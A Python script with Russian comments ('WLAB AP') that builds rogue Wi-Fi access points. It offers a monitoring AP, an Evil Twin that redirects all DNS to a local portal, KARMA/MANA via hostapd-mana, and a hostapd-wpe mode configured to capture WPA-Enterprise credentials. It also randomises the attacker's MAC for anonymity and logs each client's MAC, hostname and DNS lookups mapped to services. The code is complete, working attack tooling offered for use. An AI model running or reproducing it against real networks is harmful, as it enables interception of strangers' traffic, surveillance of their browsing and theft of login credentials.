#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WLAB :: точка доступа
=====================
Режимы:
  1  обычная точка (+ опционально WPA2) + live-монитор DNS/DHCP
  2  Evil Twin (всё DNS на нас + локальный портал)
  3  KARMA / MANA (hostapd-mana, реальный конфиг, без тихого отката)
  4  WPA-Enterprise (hostapd-wpe, реальный 802.1X)

Запуск:  wlab ap --mode 1
         wlab ap                # интерактивное меню
"""

import atexit
import json
import os
import random
import re
import shutil
import signal
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

# ---------------------------------------------------------------------------
#  пути
# ---------------------------------------------------------------------------
WLAB_ROOT = os.environ.get("WLAB_ROOT") or os.path.dirname(
    os.path.dirname(os.path.abspath(__file__))
)
WLAB_ETC = os.environ.get("WLAB_ETC", "/etc/wlab")
WLAB_STATE = os.environ.get("WLAB_STATE", "/var/log/wlab")
WLAB_RUN = os.environ.get("WLAB_RUN", "/run/wlab")
CONF_PATH = os.environ.get("WLAB_CONF", os.path.join(WLAB_ETC, "wlab.conf"))

AP_DIR = os.path.join(WLAB_STATE, "ap")
DNS_LOG = os.path.join(AP_DIR, "dns.log")
HOSTAPD_LOG = os.path.join(AP_DIR, "hostapd.log")
DNSMASQ_LOG = os.path.join(AP_DIR, "dnsmasq.log")
WPE_LOG = os.path.join(AP_DIR, "wpe.log")

HOSTAPD_CONF = os.path.join(WLAB_RUN, "hostapd.conf")
DNSMASQ_CONF = os.path.join(WLAB_RUN, "dnsmasq.conf")
EAP_USER = os.path.join(WLAB_RUN, "hostapd.eap_user")
IPFWD_ORIG = os.path.join(WLAB_RUN, "ip_forward.orig")

NAT_CHAIN = "WLAB_NAT"
FWD_CHAIN = "WLAB_FWD"

TTY = sys.stdout.isatty()


def col(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if TTY else text


def info(msg):
    print(col("36", "[*]") + " " + msg, flush=True)


def ok(msg):
    print(col("32", "[+]") + " " + msg, flush=True)


def warn(msg):
    print(col("33", "[!]") + " " + msg, flush=True)


def err(msg):
    print(col("31", "[-]") + " " + msg, flush=True)


def die(msg):
    err(msg)
    sys.exit(1)


# ---------------------------------------------------------------------------
#  конфиг
# ---------------------------------------------------------------------------
DEFAULTS = {
    "IFACE_AP": "wlan0",
    "AP_SSID": "FreeWiFi",
    "AP_PASS": "",
    "AP_IP": "192.168.50.1",
    "AP_PREFIX": "24",
    "DHCP_RANGE": "192.168.50.10,192.168.50.100",
    "CHANNEL_DEFAULT": "6",
    "IFACE_UP": "",
    "ENABLE_NAT": "1",
    "ANON_MAC": "1",
    "PORTAL_DIR": os.path.join(WLAB_ROOT, "share", "portal"),
    "LOG_JSONL": "1",
}


def _conf_value(raw):
    """Разобрать значение: снять inline-комментарий (вне кавычек) и кавычки."""
    v = raw.strip()
    out = []
    quote = None
    for i, ch in enumerate(v):
        if quote:
            out.append(ch)
            if ch == quote:
                quote = None
        elif ch in "\"'":
            quote = ch
            out.append(ch)
        elif ch == "#" and (i == 0 or v[i - 1] in " \t"):
            break
        else:
            out.append(ch)
    v = "".join(out).strip()
    if len(v) >= 2 and v[0] == v[-1] and v[0] in "\"'":
        v = v[1:-1]
    return v


def load_conf():
    conf = dict(DEFAULTS)
    try:
        with open(CONF_PATH, encoding="utf-8", errors="replace") as fh:
            for raw in fh:
                line = raw.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                conf[k.strip()] = _conf_value(v)
    except OSError:
        warn(f"конфиг {CONF_PATH} не найден, беру дефолты")
    return conf


CONF = load_conf()
IFACE = CONF["IFACE_AP"]
AP_IP = CONF["AP_IP"]
PREFIX = CONF["AP_PREFIX"]
DHCP_RANGE = CONF["DHCP_RANGE"]
PORTAL_DIR = CONF["PORTAL_DIR"]
ENABLE_NAT = CONF["ENABLE_NAT"] == "1"
ANON_MAC = CONF["ANON_MAC"] == "1"
JSONL = CONF["LOG_JSONL"] == "1"


# ---------------------------------------------------------------------------
#  утилиты
# ---------------------------------------------------------------------------
def run(args, **kw):
    kw.setdefault("stdout", subprocess.PIPE)
    kw.setdefault("stderr", subprocess.PIPE)
    kw.setdefault("text", True)
    try:
        return subprocess.run(args, **kw)
    except FileNotFoundError:
        return subprocess.CompletedProcess(args, 127, "", f"{args[0]}: not found")


def jlog(evt, **kv):
    if not JSONL:
        return
    rec = {
        "ts": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "tool": "ap",
        "evt": evt,
    }
    rec.update(kv)
    try:
        with open(os.path.join(WLAB_STATE, "ap.jsonl"), "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
    except OSError:
        pass


def require_root():
    if os.geteuid() != 0:
        warn("нужен root — перезапускаюсь через sudo")
        os.execvp("sudo", ["sudo", sys.executable, os.path.abspath(__file__)] + sys.argv[1:])


def clean_ssid(s):
    s = s.replace("\n", " ").replace("\r", " ")
    s = s.strip()[:32]
    return s


# ---------------------------------------------------------------------------
#  состояние и уборка
# ---------------------------------------------------------------------------
_STATE = {
    "procs": [],
    "server": None,
    "nat": False,
    "iface_up": False,
    "cleaned": False,
}


def cleanup(*_):
    if _STATE["cleaned"]:
        return
    _STATE["cleaned"] = True
    print()
    info("останавливаю WLAB AP...")

    for p in _STATE["procs"]:
        try:
            if p.poll() is None:
                p.terminate()
        except Exception:
            pass
    for p in _STATE["procs"]:
        try:
            p.wait(timeout=3)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass
    _STATE["procs"] = []

    if _STATE["server"] is not None:
        try:
            _STATE["server"].shutdown()
        except Exception:
            pass

    if _STATE["nat"]:
        run(["iptables", "-t", "nat", "-D", "POSTROUTING", "-j", NAT_CHAIN])
        run(["iptables", "-D", "FORWARD", "-j", FWD_CHAIN])
        run(["iptables", "-t", "nat", "-F", NAT_CHAIN])
        run(["iptables", "-F", FWD_CHAIN])
        run(["iptables", "-t", "nat", "-X", NAT_CHAIN])
        run(["iptables", "-X", FWD_CHAIN])
        try:
            with open(IPFWD_ORIG, encoding="utf-8") as fh:
                orig = fh.read().strip()
            if orig in ("0", "1"):
                run(["sysctl", "-w", f"net.ipv4.ip_forward={orig}"])
        except OSError:
            pass

    if _STATE["iface_up"]:
        run(["ip", "addr", "flush", "dev", IFACE])
        run(["ip", "link", "set", IFACE, "down"])
        run(["iw", "dev", IFACE, "set", "type", "managed"])
        run(["ip", "link", "set", IFACE, "up"])

    for f in (HOSTAPD_CONF, DNSMASQ_CONF, EAP_USER):
        try:
            os.remove(f)
        except OSError:
            pass

    jlog("stop")
    ok("готово. NetworkManager вернётся сам (systemctl start NetworkManager)")
    sys.exit(0)


def on_signal(signum, frame):
    cleanup()


def _atexit_cleanup():
    """Страховка: упали по исключению — всё равно убираем за собой."""
    if not _STATE["cleaned"]:
        try:
            cleanup()
        except SystemExit:
            pass


# ---------------------------------------------------------------------------
#  проверки
# ---------------------------------------------------------------------------
def _binary_has(path, needle):
    """Есть ли в бинарнике строка (проверка, что это реально пропатченная сборка).
    None = проверить не смогли (нет strings)."""
    try:
        out = subprocess.run(["strings", path], capture_output=True, text=True, timeout=15)
    except Exception:
        return None
    if out.returncode != 0:
        return None
    return needle in (out.stdout or "")


def preflight(mode):
    for tool in ("hostapd", "dnsmasq", "iw", "ip"):
        if shutil.which(tool) is None:
            die(f"нет {tool}. sudo apt install -y hostapd dnsmasq")
    if run(["ip", "link", "show", IFACE]).returncode != 0:
        die(f"интерфейс {IFACE} не найден (ip link show)")

    if mode == "3":
        p = shutil.which("hostapd-mana")
        if p is None:
            die("режим KARMA требует hostapd-mana, а его нет.\n"
                "    Сборка: https://github.com/sensepost/hostapd-mana\n"
                "    Я НЕ откатываюсь молча на обычный hostapd — это была бы ложь.")
        has = _binary_has(p, "enable_karma")
        if has is False:
            die(f"{p} — это ОБЫЧНЫЙ hostapd без патча KARMA.\n"
                "    Он не знает 'enable_karma' и упадёт на конфиге (ты это уже видел).\n"
                "    Варианты:\n"
                "      1) собрать настоящий: https://github.com/sensepost/hostapd-mana\n"
                "      2) забить и юзать режим 2 (evil twin) — работает без патчей")

    if mode == "4":
        p = shutil.which("hostapd-wpe")
        if p is None:
            die("режим WPA-Enterprise требует hostapd-wpe, а его нет.\n"
                "    sudo apt install -y hostapd-wpe")
        has = _binary_has(p, "wpe_logfile")
        if has is False:
            die(f"{p} — обычный hostapd без патча WPE (нет 'wpe_logfile')")

    ap_modes = run(["iw", "list"], text=True).stdout
    if "AP" not in ap_modes:
        warn(f"{IFACE}: iw list не показывает поддержку AP — может не подняться")
    elif "* AP" not in ap_modes:
        warn(f"{IFACE}: AP в списке есть, но не активен — проверь драйвер")


# ---------------------------------------------------------------------------
#  конфиги
# ---------------------------------------------------------------------------
BASE_HAPD = """interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
{wpa}
{extra}
"""

WPA_BLOCK = "wpa=2\nwpa_passphrase={pwd}\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n"


def write_eap_user():
    # ВАЖНО: имена методов чувствительны к регистру.
    # hostapd знает TTLS-MSCHAPV2 (большая V), а TTLS-MSCHAPv2 — нет.
    with open(EAP_USER, "w", encoding="utf-8") as fh:
        fh.write("*\tPEAP,TTLS,TLS,MD5,GTC\n")
        fh.write('"t"\tTTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MD5,GTC,TTLS'
                 '\t"password"\t[2]\n')


WPE_CERT_DIRS = (
    "/etc/hostapd-wpe/certs",
    "/usr/share/hostapd-wpe/certs",
    "/usr/local/etc/hostapd-wpe/certs",
    "/etc/hostapd/certs",
    "/etc/hostapd",
)


def find_wpe_certs():
    """Где лежат сертификаты hostapd-wpe. Пустая строка = не нашли."""
    for d in WPE_CERT_DIRS:
        if os.path.isfile(os.path.join(d, "server.pem")):
            return d
    return ""


def write_hostapd(mode, ssid, channel, password):
    wpa = ""
    extra = ""
    if mode == "1" and password:
        wpa = WPA_BLOCK.format(pwd=password)
    elif mode == "2" and password:
        wpa = WPA_BLOCK.format(pwd=password)
    elif mode == "3":
        extra = "enable_karma=1\nkarma_loud=1\n"
    elif mode == "4":
        write_eap_user()
        wpa = ("wpa=1\n"
               "wpa_key_mgmt=WPA-EAP\n"
               "ieee8021x=1\n"
               "eap_server=1\n"
               f"eap_user_file={EAP_USER}\n"
               f"wpe_logfile={WPE_LOG}\n")
        certs = find_wpe_certs()
        if certs:
            if os.path.isfile(os.path.join(certs, "ca.pem")):
                wpa += f"ca_cert={certs}/ca.pem\n"
            if os.path.isfile(os.path.join(certs, "dh")):
                wpa += f"dh_file={certs}/dh\n"
            wpa += (f"server_cert={certs}/server.pem\n"
                    f"private_key={certs}/server.pem\n"
                    "private_key_passwd=whatever\n")
        else:
            warn("сертификаты hostapd-wpe не найдены — беру дефолтные пути")

    body = BASE_HAPD.format(iface=IFACE, ssid=ssid, channel=channel, wpa=wpa, extra=extra)
    body = "\n".join(line for line in body.splitlines() if line.strip()) + "\n"
    with open(HOSTAPD_CONF, "w", encoding="utf-8") as fh:
        fh.write(body)
    return body


def write_dnsmasq(mode):
    lines = [
        f"interface={IFACE}",
        "bind-dynamic",
        f"dhcp-range={DHCP_RANGE},12h",
        f"dhcp-option=3,{AP_IP}",
        f"dhcp-option=6,{AP_IP}",
        "dhcp-authoritative",
        "log-queries",
        "log-dhcp",
        f"log-facility={DNS_LOG}",
        "domain=wlab",
    ]
    if mode == "2":
        # всё, что угодно -> мы; наверх ничего не уходит (анонимность)
        lines += ["no-resolv", f"address=/#/{AP_IP}"]
    body = "\n".join(lines) + "\n"
    with open(DNSMASQ_CONF, "w", encoding="utf-8") as fh:
        fh.write(body)
    return body


# ---------------------------------------------------------------------------
#  сервисы
# ---------------------------------------------------------------------------
def start_hostapd(mode):
    binary = {"3": "hostapd-mana", "4": "hostapd-wpe"}.get(mode, "hostapd")
    # "w": каждый запуск — чистый лог, иначе хвосты прошлых режимов путают
    fh = open(HOSTAPD_LOG, "w", encoding="utf-8")
    p = subprocess.Popen(
        [binary, HOSTAPD_CONF],
        stdout=fh, stderr=subprocess.STDOUT,
        start_new_session=True,
    )
    _STATE["procs"].append(p)
    return p


def start_dnsmasq():
    check = run(["dnsmasq", "--test", "-C", DNSMASQ_CONF])
    if check.returncode != 0:
        die("dnsmasq конфиг битый:\n" + (check.stderr or check.stdout))
    fh = open(DNSMASQ_LOG, "a", encoding="utf-8")
    p = subprocess.Popen(
        ["dnsmasq", "-C", DNSMASQ_CONF, "-k"],
        stdout=fh, stderr=subprocess.STDOUT,
        start_new_session=True,
    )
    _STATE["procs"].append(p)
    return p


def verify_ap(timeout=10):
    deadline = time.time() + timeout
    while time.time() < deadline:
        info_txt = run(["iw", "dev", IFACE, "info"]).stdout or ""
        if "type AP" in info_txt:
            return True
        time.sleep(0.5)
    return False


def detect_uplink():
    if CONF.get("IFACE_UP"):
        return CONF["IFACE_UP"]
    out = run(["ip", "route", "show", "default"]).stdout or ""
    m = re.search(r"default.*?dev\s+(\S+)", out)
    return m.group(1) if m else ""


def setup_nat():
    uplink = detect_uplink()
    if not uplink:
        warn("не нашёл аплинк (default route) — NAT не включаю")
        return
    try:
        with open(IPFWD_ORIG, encoding="utf-8") as fh:
            pass
    except OSError:
        cur = run(["sysctl", "-n", "net.ipv4.ip_forward"]).stdout.strip()
        with open(IPFWD_ORIG, "w", encoding="utf-8") as fh:
            fh.write(cur or "0")

    run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    run(["iptables", "-t", "nat", "-N", NAT_CHAIN])
    run(["iptables", "-t", "nat", "-F", NAT_CHAIN])
    run(["iptables", "-t", "nat", "-A", NAT_CHAIN, "-o", uplink, "-j", "MASQUERADE"])
    if run(["iptables", "-t", "nat", "-C", "POSTROUTING", "-j", NAT_CHAIN]).returncode != 0:
        run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-j", NAT_CHAIN])

    run(["iptables", "-N", FWD_CHAIN])
    run(["iptables", "-F", FWD_CHAIN])
    run(["iptables", "-A", FWD_CHAIN, "-i", IFACE, "-o", uplink, "-j", "ACCEPT"])
    run(["iptables", "-A", FWD_CHAIN, "-i", uplink, "-o", IFACE,
         "-m", "conntrack", "--ctstate", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
    if run(["iptables", "-C", "FORWARD", "-j", FWD_CHAIN]).returncode != 0:
        run(["iptables", "-A", "FORWARD", "-j", FWD_CHAIN])

    _STATE["nat"] = True
    ok(f"NAT включён: {IFACE} -> {uplink}")


def start_portal():
    index = os.path.join(PORTAL_DIR, "index.html")
    if not os.path.isfile(index):
        warn(f"портала нет: {index} — пропускаю")
        return

    class Handler(SimpleHTTPRequestHandler):
        def __init__(self, *a, **kw):
            super().__init__(*a, directory=PORTAL_DIR, **kw)

        def do_GET(self):
            ip = self.client_address[0]
            ts = datetime.now().strftime("%H:%M:%S")
            print(col("90", f"{ts:<10}") + col("33", " [PORTAL] ") + f"GET {self.path} {ip}",
                  flush=True)
            jlog("portal", path=self.path, ip=ip)
            super().do_GET()

        def do_POST(self):
            ip = self.client_address[0]
            ts = datetime.now().strftime("%H:%M:%S")
            print(col("90", f"{ts:<10}") + col("33", " [PORTAL] ") + f"POST {self.path} {ip}",
                  flush=True)
            jlog("portal", path=self.path, ip=ip)
            self.send_response(204)
            self.end_headers()

        def log_message(self, *a):
            pass

    try:
        srv = ThreadingHTTPServer((AP_IP, 80), Handler)
    except OSError as exc:
        warn(f"порт 80 занят ({exc}) — портал не поднят")
        return
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    _STATE["server"] = srv
    ok(f"портал: http://{AP_IP}/")


# ---------------------------------------------------------------------------
#  монитор
# ---------------------------------------------------------------------------
RE_DHCP = re.compile(r"DHCPACK\((\w+)\)\s+(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F:]{17})(?:\s+(\S+))?")
RE_QUERY = re.compile(r"query\[([A-Z0-9]+)\]\s+(\S+)\s+from\s+(\d+\.\d+\.\d+\.\d+)")

# домен -> сервис по суффиксу
SERVICES = (
    ("apple.com", "Apple"), ("icloud.com", "Apple"), ("mzstatic.com", "Apple"),
    ("apple-dns.net", "Apple"), ("cdn-apple.com", "Apple"),
    ("google.com", "Google"), ("gstatic.com", "Google"), ("googleapis.com", "Google"),
    ("googlevideo.com", "Google"), ("gvt1.com", "Google"), ("google.ru", "Google"),
    ("vk.com", "VK"), ("vk.ru", "VK"), ("userapi.com", "VK"), ("vk-analytics.ru", "VK"),
    ("mycdn.me", "VK"), ("vkmessenger.com", "VK"),
    ("mail.ru", "Mail.ru"), ("imgsmail.ru", "Mail.ru"), ("list.ru", "Mail.ru"),
    ("bk.ru", "Mail.ru"),
    ("yandex.ru", "Yandex"), ("yandex.net", "Yandex"), ("ya.ru", "Yandex"),
    ("yastatic.net", "Yandex"),
    ("telegram.org", "Telegram"), ("telegram.me", "Telegram"), ("tdesktop.com", "Telegram"),
    ("whatsapp.net", "WhatsApp"), ("whatsapp.com", "WhatsApp"),
    ("instagram.com", "Meta"), ("facebook.com", "Meta"), ("fbcdn.net", "Meta"),
    ("tiktokv.com", "TikTok"), ("byteoversea.com", "TikTok"),
    ("netflix.com", "Netflix"), ("nflxvideo.net", "Netflix"),
    ("microsoft.com", "Microsoft"), ("live.com", "Microsoft"),
    ("windowsupdate.com", "Microsoft"), ("msftconnecttest.com", "Microsoft"),
    ("spotify.com", "Spotify"), ("discord.com", "Discord"), ("twitch.tv", "Twitch"),
    ("xiaomi.com", "Xiaomi"), ("miui.com", "Xiaomi"), ("mi.com", "Xiaomi"),
    ("huawei.com", "Huawei"), ("samsung.com", "Samsung"),
    ("cloudflare.com", "Cloudflare"), ("akamai.net", "Akamai"), ("fastly.net", "Fastly"),
)


def service_of(name):
    n = name.lower().rstrip(".")
    for suf, label in SERVICES:
        if n == suf or n.endswith("." + suf):
            return label
    return ""


def follow_dns(show_all=False, mode="1"):
    """Показывает DNS-запросы клиентов. Шум режем: только A + дедуп 5 сек."""
    fh = None
    inode = None
    seen = {}
    window = 5.0

    info(f"монитор: {DNS_LOG}  (Ctrl+C — стоп)")

    if mode == "2":
        print(col("33", f"!!! EVIL TWIN: любой DNS -> {AP_IP}, портал на http://{AP_IP}/"),
              flush=True)
        print(col("90", "    интернета у клиента НЕТ — только твоя страница"), flush=True)

    header = (col("90", f"{'ВРЕМЯ':<10}") + f"{'ДОМЕН':<44}"
              + col("90", f"{'СЕРВИС':<12}") + col("90", "КЛИЕНТ"))
    print(header, flush=True)
    print(col("90", "─" * 80), flush=True)

    while True:
        try:
            st = os.stat(DNS_LOG)
        except FileNotFoundError:
            time.sleep(0.2)
            continue
        if fh is None or inode != st.st_ino:
            if fh:
                fh.close()
            fh = open(DNS_LOG, "r", encoding="utf-8", errors="replace")
            fh.seek(0, os.SEEK_END)
            inode = st.st_ino
        if st.st_size < fh.tell():
            fh.seek(0)

        line = fh.readline()
        if not line:
            time.sleep(0.15)
            continue

        ts = datetime.now().strftime("%H:%M:%S")

        m = RE_DHCP.search(line)
        if m:
            ip, mac, host = m.group(2), m.group(3), (m.group(4) or "")
            print(col("90", f"{ts:<10}") + col("32", "[JOIN] ") + f"{ip:<15} {mac} {host}",
                  flush=True)
            jlog("client", ip=ip, mac=mac, host=host)
            continue

        m = RE_QUERY.search(line)
        if not m:
            continue
        qtype, name, src = m.groups()

        # по умолчанию только A: AAAA — тот же домен, лишний шум
        if not show_all and qtype != "A":
            continue

        now = time.time()
        key = (name, src)
        if now - seen.get(key, 0.0) < window:
            continue
        seen[key] = now

        svc = service_of(name)
        svc_col = col("36", f"{svc:<12}") if svc else col("90", f"{'-':<12}")
        print(col("90", f"{ts:<10}") + f"{name[:44]:<44}" + svc_col + f" {src}", flush=True)
        jlog("dns", name=name, src=src, type=qtype, svc=svc)


# ---------------------------------------------------------------------------
#  меню и запуск
# ---------------------------------------------------------------------------
MENU = """
1) Своя точка + LIVE монитор (DNS + DHCP)
2) Evil Twin (всё DNS на нас + портал)
3) KARMA / MANA  (нужен hostapd-mana)
4) WPA-Enterprise (нужен hostapd-wpe)
"""


def ask(prompt, default=""):
    suffix = f" [{default}]" if default else ""
    try:
        val = input(f"{prompt}{suffix}: ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        sys.exit(1)
    return val or default


def parse_args(argv):
    opts = {"mode": "", "ssid": "", "channel": "", "password": "",
            "nat": None, "anon": None, "portal": True, "dns_all": False}
    i = 0
    while i < len(argv):
        a = argv[i]
        if a in ("-m", "--mode"):
            i += 1
            opts["mode"] = argv[i]
        elif a in ("-s", "--ssid"):
            i += 1
            opts["ssid"] = argv[i]
        elif a in ("-c", "--channel"):
            i += 1
            opts["channel"] = argv[i]
        elif a in ("-p", "--pass"):
            i += 1
            opts["password"] = argv[i]
        elif a == "--no-nat":
            opts["nat"] = False
        elif a == "--nat":
            opts["nat"] = True
        elif a == "--no-anon":
            opts["anon"] = False
        elif a == "--no-portal":
            opts["portal"] = False
        elif a == "--dns-all":
            opts["dns_all"] = True
        elif a in ("-h", "--help"):
            print(__doc__)
            sys.exit(0)
        else:
            die(f"неизвестный аргумент: {a}")
        i += 1
    return opts


def main():
    require_root()
    opts = parse_args(sys.argv[1:])

    for d in (AP_DIR, WLAB_RUN):
        os.makedirs(d, exist_ok=True)

    if not opts["mode"]:
        print(col("1;36", "╔══════════════════════════════════════════════════════════╗"))
        print(col("1;36", "║") + "            WLAB AP v10.0 — точка доступа              " + col("1;36", "║"))
        print(col("1;36", "╚══════════════════════════════════════════════════════════╝"))
        print(MENU)
        opts["mode"] = ask("Режим", "1")

    mode = opts["mode"].strip()
    if mode not in ("1", "2", "3", "4"):
        die(f"режим должен быть 1-4, а не '{mode}'")

    preflight(mode)

    ssid = clean_ssid(opts["ssid"] or ask("SSID", CONF["AP_SSID"]) or "FreeWiFi")
    channel = (opts["channel"] or ask("Канал (1-13)", CONF["CHANNEL_DEFAULT"]) or "6").strip()
    if not channel.isdigit() or not (1 <= int(channel) <= 13):
        die(f"канал '{channel}' вне 1-13")
    password = opts["password"]
    if mode in ("1", "2"):
        # WPA-PSK: пароль строго 8..63 символа, иначе hostapd падает
        if password and not (8 <= len(password) <= 63):
            die(f"пароль '{password}' — {len(password)} символов, а нужно 8..63 "
                f"(или пусто для открытой сети)")
        while not password:
            p = ask("Пароль (8..63 символа, Enter = открытая сеть)", "")
            if not p:
                break
            if 8 <= len(p) <= 63:
                password = p
                break
            warn(f"'{p}' — {len(p)} символов, нужно 8..63. Ещё раз.")

    banner_mode = {"1": "ОБЫЧНАЯ ТОЧКА", "2": "EVIL TWIN", "3": "KARMA/MANA",
                   "4": "WPA-ENTERPRISE"}[mode]
    print()
    ok(f"режим: {banner_mode}")
    ok(f"SSID: {ssid}  канал: {channel}  iface: {IFACE}")

    signal.signal(signal.SIGINT, on_signal)
    signal.signal(signal.SIGTERM, on_signal)
    atexit.register(_atexit_cleanup)

    if (opts["anon"] if opts["anon"] is not None else ANON_MAC):
        run(["ip", "link", "set", IFACE, "down"])
        if shutil.which("macchanger"):
            run(["macchanger", "-r", IFACE])
        else:
            rand = "02:%02x:%02x:%02x:%02x:%02x" % tuple(
                random.randrange(256) for _ in range(5)
            )
            run(["ip", "link", "set", IFACE, "address", rand])
        mac = ""
        try:
            with open(f"/sys/class/net/{IFACE}/address", encoding="utf-8") as fh:
                mac = fh.read().strip()
        except OSError:
            pass
        ok(f"MAC {IFACE} -> {mac}")

    # интерфейс в managed + IP
    run(["ip", "link", "set", IFACE, "down"])
    run(["iw", "dev", IFACE, "set", "type", "managed"])
    run(["ip", "link", "set", IFACE, "up"])
    run(["ip", "addr", "flush", "dev", IFACE])
    r = run(["ip", "addr", "add", f"{AP_IP}/{PREFIX}", "dev", IFACE])
    if r.returncode != 0:
        die(f"не смог назначить {AP_IP}/{PREFIX} на {IFACE}: {r.stderr.strip()}")
    _STATE["iface_up"] = True

    try:
        os.remove(DNS_LOG)
    except OSError:
        pass

    write_hostapd(mode, ssid, channel, password)
    write_dnsmasq(mode)
    jlog("start", mode=mode, ssid=ssid, channel=channel, iface=IFACE)

    if (opts["nat"] if opts["nat"] is not None else ENABLE_NAT):
        setup_nat()

    h = start_hostapd(mode)
    if not verify_ap():
        err("hostapd не поднял AP. Последние строки:")
        try:
            with open(HOSTAPD_LOG, encoding="utf-8", errors="replace") as fh:
                print("".join(fh.readlines()[-20:]))
        except OSError:
            pass
        wlab_hint = ("hostapd-wpe: проверь, что это пропатченная сборка "
                     "(strings $(which hostapd-wpe) | grep wpe_logfile)"
                     if mode == "4" else "")
        if wlab_hint:
            err(wlab_hint)
        cleanup()

    ok(f"AP поднята: {ssid} на {AP_IP}")

    start_dnsmasq()
    time.sleep(0.5)

    if mode == "2" and opts["portal"]:
        start_portal()

    if mode == "2":
        ok(f"DNS-редирект: * -> {AP_IP}")
    if mode == "4":
        ok(f"WPE лог: {WPE_LOG}")

    print()
    follow_dns(opts["dns_all"], mode)


if __name__ == "__main__":
    main()
